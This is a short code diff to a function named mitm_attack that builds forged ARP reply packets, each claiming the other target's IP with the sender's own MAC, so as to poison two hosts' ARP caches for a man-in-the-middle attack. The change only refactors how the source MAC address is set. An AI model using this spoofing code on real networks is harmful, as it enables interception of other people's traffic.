@@ -28,17 +28,18 @@ void mitm_attack(const char* ip1, const char* mac1,
 	pgen_arp pack_to_target1;
 	pgen_arp pack_to_target2;
 
-	pack_to_target1.ETH.src = pgen_getMAC(dev);
+	//pack_to_target1.ETH.src = pgen_getMAC(dev);
+	pack_to_target1.ETH.src.setmacbydev(dev);
 	pack_to_target1.ETH.dst = mac1;
-	pack_to_target1.ARP.srcEth = pgen_getMAC(dev);
+	pack_to_target1.ARP.srcEth.setmacbydev(dev);
 	pack_to_target1.ARP.srcIp  = ip2;
 	pack_to_target1.ARP.dstEth = mac1;
 	pack_to_target1.ARP.dstIp  = ip1;
 	pack_to_target1.ARP.option = PGEN_ARPOP_REPLY;
 
-	pack_to_target2.ETH.src = pgen_getMAC(dev);
+	pack_to_target2.ETH.src.setmacbydev(dev);
 	pack_to_target2.ETH.dst = mac2;
-	pack_to_target2.ARP.srcEth = pgen_getMAC(dev);
+	pack_to_target2.ARP.srcEth.setmacbydev(dev);
 	pack_to_target2.ARP.srcIp  = ip1;
 	pack_to_target2.ARP.dstEth = mac2;
 	pack_to_target2.ARP.dstIp  = ip2;
